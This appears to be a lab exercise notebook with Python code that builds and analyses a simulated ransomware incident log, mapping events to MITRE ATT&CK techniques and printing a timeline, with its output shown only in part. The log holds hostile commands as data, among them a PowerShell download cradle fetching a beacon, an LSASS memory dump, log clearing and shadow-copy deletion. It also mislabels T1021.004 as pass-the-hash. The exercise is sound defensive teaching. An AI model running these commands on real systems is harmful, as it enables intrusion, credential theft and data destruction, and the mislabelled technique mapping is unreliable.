## **Aim**
To implement a program that analyzes a simulated ransomware incident log and reconstructs the sequence of attack events.

## **Algorithm**
**Step 1:** Import `json`, `datetime`, `collections`, and `re` libraries.

**Step 2:** Create a simulated ransomware incident log (JSON) containing events across the kill chain:
   - Initial access (phishing, exploit, RDP)
   - Execution (malware drop, script execution)
   - Persistence (registry, scheduled tasks, services)
   - Privilege escalation (exploits, token manipulation)
   - Defense evasion (disable AV, clear logs)
   - Credential access (dumping, keylogging)
   - Discovery (network, system, file)
   - Lateral movement (SMB, RDP, WMI)
   - Collection (staging, compression)
   - Exfiltration (C2, cloud)
   - Impact (encryption, destruction)

**Step 3:** Parse events and map to MITRE ATT&CK techniques.

**Step 4:** Sort events chronologically and build attack timeline.

**Step 5:** Identify the attack chain and root cause.

**Step 6:** Generate incident reconstruction report with timeline, IOCs, and MITRE mapping.

In [1]:
import json
from datetime import datetime, timedelta
from collections import defaultdict
import os

MITRE_TECHNIQUES = {
    "T1566.001": "Phishing: Spearphishing Attachment",
    "T1190": "Exploit Public-Facing Application",
    "T1021.001": "Remote Services: RDP",
    "T1059.001": "Command and Scripting Interpreter: PowerShell",
    "T1059.003": "Command and Scripting Interpreter: Windows Command Shell",
    "T1204.002": "User Execution: Malicious File",
    "T1547.001": "Boot or Logon Autostart Execution: Registry Run Keys",
    "T1053.005": "Scheduled Task/Job: Scheduled Task",
    "T1543.003": "Create or Modify System Process: Windows Service",
    "T1068": "Exploitation for Privilege Escalation",
    "T1134.001": "Access Token Manipulation: Token Impersonation",
    "T1562.001": "Impair Defenses: Disable or Modify Tools",
    "T1070.001": "Indicator Removal: Clear Windows Event Logs",
    "T1003.001": "OS Credential Dumping: LSASS Memory",
    "T1056.001": "Input Capture: Keylogging",
    "T1087.001": "Account Discovery: Local Account",
    "T1018": "Remote System Discovery",
    "T1083": "File and Directory Discovery",
    "T1021.002": "Remote Services: SMB/Windows Admin Shares",
    "T1021.003": "Remote Services: Distributed Component Object Model",
    "T1021.004": "Remote Services: Pass the Hash",
    "T1560.001": "Archive Collected Data: Archive via Utility",
    "T1041": "Exfiltration Over Command and Control Channel",
    "T1567.002": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
    "T1486": "Data Encrypted for Impact",
    "T1490": "Inhibit System Recovery",
}

def create_sample_incident_log(log_file):
    """Create a simulated ransomware incident log"""
    now = datetime.now()
    base = now - timedelta(hours=72)
    
    events = [
        # Initial Access - Phishing
        {"timestamp": (base + timedelta(minutes=5)).isoformat(), "stage": "INITIAL_ACCESS",
         "technique": "T1566.001", "source": "EMAIL_GATEWAY",
         "description": "Phishing email delivered to user@company.com with malicious .docx attachment",
         "details": {"sender": "invoice@vendor-services.xyz", "subject": "Invoice #2026-0820",
                     "attachment": "Invoice_2026-0820.docx", "sha256": "a1b2c3d4..."}},
        
        # Execution - Macro execution
        {"timestamp": (base + timedelta(minutes=15)).isoformat(), "stage": "EXECUTION",
         "technique": "T1204.002", "source": "EDR",
         "description": "User opened malicious document, macro executed PowerShell",
         "details": {"process": "WINWORD.EXE", "child": "powershell.exe",
                     "command": "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0...",
                     "pid": 4521, "user": "user"}},
        
        # Execution - Payload download
        {"timestamp": (base + timedelta(minutes=16)).isoformat(), "stage": "EXECUTION",
         "technique": "T1059.001", "source": "EDR",
         "description": "PowerShell downloaded Cobalt Strike beacon",
         "details": {"command": "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.50/beacon.ps1')",
                     "url": "http://192.168.100.50/beacon.ps1", "pid": 5678}},
        
        # Persistence - Registry Run Key
        {"timestamp": (base + timedelta(minutes=20)).isoformat(), "stage": "PERSISTENCE",
         "technique": "T1547.001", "source": "EDR",
         "description": "Beacon added persistence via HKCU Run key",
         "details": {"registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     "value": "WindowsUpdate", "data": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\svchost.exe"}},
        
        # Persistence - Scheduled Task
        {"timestamp": (base + timedelta(minutes=25)).isoformat(), "stage": "PERSISTENCE",
         "technique": "T1053.005", "source": "EDR",
         "description": "Created scheduled task for persistence",
         "details": {"task_name": "Microsoft\\Windows\\CertificateServices\\CertEnroll",
                     "action": "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\svchost.exe",
                     "trigger": "At log on"}},
        
        # Privilege Escalation - Token Manipulation
        {"timestamp": (base + timedelta(hours=1)).isoformat(), "stage": "PRIVILEGE_ESCALATION",
         "technique": "T1134.001", "source": "EDR",
         "description": "Beacon impersonated SYSTEM token via named pipe",
         "details": {"method": "Named pipe impersonation", "target": "SYSTEM", "success": True}},
        
        # Defense Evasion - Disable Defender
        {"timestamp": (base + timedelta(hours=1, minutes=5)).isoformat(), "stage": "DEFENSE_EVASION",
         "technique": "T1562.001", "source": "EDR",
         "description": "Disabled Windows Defender real-time protection",
         "details": {"command": "Set-MpPreference -DisableRealtimeMonitoring $true",
                     "process": "powershell.exe", "success": True}},
        
        # Defense Evasion - Clear Event Logs
        {"timestamp": (base + timedelta(hours=1, minutes=10)).isoformat(), "stage": "DEFENSE_EVASION",
         "technique": "T1070.001", "source": "EDR",
         "description": "Cleared Security and System event logs",
         "details": {"command": "wevtutil cl Security && wevtutil cl System",
                     "logs_cleared": ["Security", "System"]}},
        
        # Credential Access - LSASS Dump
        {"timestamp": (base + timedelta(hours=2)).isoformat(), "stage": "CREDENTIAL_ACCESS",
         "technique": "T1003.001", "source": "EDR",
         "description": "Dumped LSASS memory using comsvcs.dll",
         "details": {"command": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\Temp\\lsass.dmp full",
                     "output": "C:\\Temp\\lsass.dmp", "pid": 7890}},
        
        # Discovery - Network Scan
        {"timestamp": (base + timedelta(hours=2, minutes=30)).isoformat(), "stage": "DISCOVERY",
         "technique": "T1018", "source": "EDR",
         "description": "Internal network scan from compromised host",
         "details": {"tool": "SharpScan", "targets": "192.168.1.0/24", "ports": "445,3389,135,5985",
                     "results": "15 live hosts found"}},
        
        # Discovery - File Discovery
        {"timestamp": (base + timedelta(hours=3)).isoformat(), "stage": "DISCOVERY",
         "technique": "T1083", "source": "EDR",
         "description": "Enumerated file shares and sensitive directories",
         "details": {"command": "net view \\\\* && dir \\\\FILESERVER\\Share$",
                     "shares_found": ["\\\\FILESERVER\\Data", "\\\\FILESERVER\\HR", "\\\\FILESERVER\\Finance"]}},
        
        # Lateral Movement - SMB
        {"timestamp": (base + timedelta(hours=4)).isoformat(), "stage": "LATERAL_MOVEMENT",
         "technique": "T1021.002", "source": "EDR",
         "description": "Lateral movement to FILESERVER via SMB",
         "details": {"source": "WORKSTATION-01", "target": "FILESERVER",
                     "method": "PsExec with dumped credentials", "user": "DOMAIN\\admin"}},
        
        # Lateral Movement - Pass the Hash
        {"timestamp": (base + timedelta(hours=4, minutes=15)).isoformat(), "stage": "LATERAL_MOVEMENT",
         "technique": "T1021.004", "source": "EDR",
         "description": "Pass-the-hash to DC01",
         "details": {"source": "FILESERVER", "target": "DC01",
                     "hash": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"}},
        
        # Collection - Staging
        {"timestamp": (base + timedelta(hours=5)).isoformat(), "stage": "COLLECTION",
         "technique": "T1560.001", "source": "EDR",
         "description": "Collected and archived sensitive data",
         "details": {"files": "5000+", "size_gb": 12.5, "archive": "C:\\Temp\\staging\\exfil_20260820.zip",
                     "targets": ["HR", "Finance", "SourceCode"]}},
        
        # Exfiltration - C2
        {"timestamp": (base + timedelta(hours=6)).isoformat(), "stage": "EXFILTRATION",
         "technique": "T1041", "source": "FIREWALL",
         "description": "Large data transfer to C2 server",
         "details": {"destination": "192.168.100.50:443", "protocol": "HTTPS",
                     "bytes": "12.5 GB", "duration_minutes": 45}},
        
        # Impact - Encryption starts
        {"timestamp": (base + timedelta(hours=6, minutes=30)).isoformat(), "stage": "IMPACT",
         "technique": "T1486", "source": "EDR",
         "description": "Ransomware encryption started on FILESERVER",
         "details": {"process": "svchost.exe", "extension": ".blackcat",
                     "files_encrypted": "15000+", "ransom_note": "README_RECOVER.txt"}},
        
        # Impact - Inhibit Recovery
        {"timestamp": (base + timedelta(hours=6, minutes=40)).isoformat(), "stage": "IMPACT",
         "technique": "T1490", "source": "EDR",
         "description": "Deleted volume shadow copies",
         "details": {"command": "vssadmin delete shadows /all /quiet",
                     "success": True}},
    ]
    
    with open(log_file, "w") as f:
        json.dump(events, f, indent=2)

def analyze_incident(log_file):
    """Analyze incident log and reconstruct attack"""
    with open(log_file, "r") as f:
        events = json.load(f)
    
    # Sort by timestamp
    events.sort(key=lambda x: x["timestamp"])
    
    # Group by stage
    stages = defaultdict(list)
    for e in events:
        stages[e["stage"]].append(e)
    
    # Build timeline
    timeline = []
    for e in events:
        ts = datetime.fromisoformat(e["timestamp"])
        technique_name = MITRE_TECHNIQUES.get(e["technique"], "Unknown")
        timeline.append({
            "time": ts,
            "stage": e["stage"],
            "technique_id": e["technique"],
            "technique_name": technique_name,
            "description": e["description"],
            "source": e["source"]
        })
    
    # Extract IOCs
    iocs = {
        "ips": set(),
        "domains": set(),
        "file_hashes": set(),
        "filenames": set(),
        "registry_keys": set(),
        "commands": set()
    }
    
    for e in events:
        details = e.get("details", {})
        if "url" in details:
            # Extract domain/IP from URL
            import re
            url = details["url"]
            match = re.search(r'https?://([^/]+)', url)
            if match:
                iocs["ips"].add(match.group(1))
        if "destination" in details:
            iocs["ips"].add(details["destination"].split(":")[0])
        if "sha256" in details:
            iocs["file_hashes"].add(details["sha256"])
        if "attachment" in details:
            iocs["filenames"].add(details["attachment"])
        if "registry_key" in details:
            iocs["registry_keys"].add(details["registry_key"])
        if "command" in details:
            iocs["commands"].add(details["command"])
    
    return {
        "timeline": timeline,
        "stages": dict(stages),
        "iocs": {k: list(v) for k, v in iocs.items()},
        "total_events": len(events),
        "duration_hours": (datetime.fromisoformat(events[-1]["timestamp"]) - 
                          datetime.fromisoformat(events[0]["timestamp"])).total_seconds() / 3600
    }

def main():
    log_file = "ransomware_incident_log.json"
    create_sample_incident_log(log_file)
    
    print("Analyzing ransomware incident log...")
    results = analyze_incident(log_file)
    
    print(f"\n{'='*70}")
    print(f"RANSOMWARE INCIDENT RECONSTRUCTION")
    print(f"{'='*70}")
    print(f"Total Events: {results['total_events']}")
    print(f"Attack Duration: {results['duration_hours']:.1f} hours")
    print(f"Stages Observed: {len(results['stages'])}")
    
    print(f"\n--- ATTACK TIMELINE ---")
    for i, e in enumerate(results["timeline"], 1):
        print(f"\n{i}. [{e['time'].strftime('%Y-%m-%d %H:%M:%S')}] {e['stage']}")
        print(f"    MITRE: {e['technique_id']} - {e['technique_name']}")
        print(f"    Source: {e['source']}")
        print(f"    Action: {e['description']}")
    
    print(f"\n--- STAGE SUMMARY ---")
    stage_order = ["INITIAL_ACCESS", "EXECUTION", "PERSISTENCE", "PRIVILEGE_ESCALATION",
                   "DEFENSE_EVASION", "CREDENTIAL_ACCESS", "DISCOVERY", "LATERAL_MOVEMENT",
                   "COLLECTION", "EXFILTRATION", "IMPACT"]
    for stage in stage_order:
        if stage in results["stages"]:
            count = len(results["stages"][stage])
            print(f"  {stage}: {count} events")
    
    print(f"\n--- INDICATORS OF COMPROMISE (IOCs) ---")
    for ioc_type, values in results["iocs"].items():
        if values:
            print(f"\n  {ioc_type.upper()}:")
            for v in values:
                print(f"    - {v}")
    
    print(f"\n--- ATTACK CHAIN SUMMARY ---")
    print(f"1. INITIAL ACCESS: Phishing email with malicious macro document")
    print(f"2. EXECUTION: PowerShell downloaded Cobalt Strike beacon")
    print(f"3. PERSISTENCE: Registry Run key + Scheduled Task")
    print(f"4. PRIVILEGE ESCALATION: Token impersonation to SYSTEM")
    print(f"5. DEFENSE EVASION: Disabled Defender, cleared event logs")
    print(f"6. CREDENTIAL ACCESS: LSASS dump via comsvcs.dll")
    print(f"7. DISCOVERY: Network scan, file share enumeration")
    print(f"8. LATERAL MOVEMENT: PsExec + Pass-the-hash to DC01")
    print(f"9. COLLECTION: 12.5 GB staged from file shares")
    print(f"10. EXFILTRATION: Data sent to C2 over HTTPS")
    print(f"11. IMPACT: BlackCat ransomware encryption, shadow copies deleted")

if __name__ == "__main__":
    main()

Analyzing ransomware incident log...

RANSOMWARE INCIDENT RECONSTRUCTION
Total Events: 17
Attack Duration: 6.6 hours
Stages Observed: 11

--- ATTACK TIMELINE ---

1. [2026-08-17 09:36:28] INITIAL_ACCESS
    MITRE: T1566.001 - Phishing: Spearphishing Attachment
    Source: EMAIL_GATEWAY
    Action: Phishing email delivered to user@company.com with malicious .docx attachment

2. [2026-08-17 09:46:28] EXECUTION
    MITRE: T1204.002 - User Execution: Malicious File
    Source: EDR
    Action: User opened malicious document, macro executed PowerShell

3. [2026-08-17 09:47:28] EXECUTION
    MITRE: T1059.001 - Command and Scripting Interpreter: PowerShell
    Source: EDR
    Action: PowerShell downloaded Cobalt Strike beacon

4. [2026-08-17 09:51:28] PERSISTENCE
    MITRE: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys
    Source: EDR
    Action: Beacon added persistence via HKCU Run key

5. [2026-08-17 09:56:28] PERSISTENCE
    MITRE: T1053.005 - Scheduled Task/Job: Schedul

## **Result**
This the program successfully analyzes a simulated ransomware incident log and reconstructs the sequence of attack events.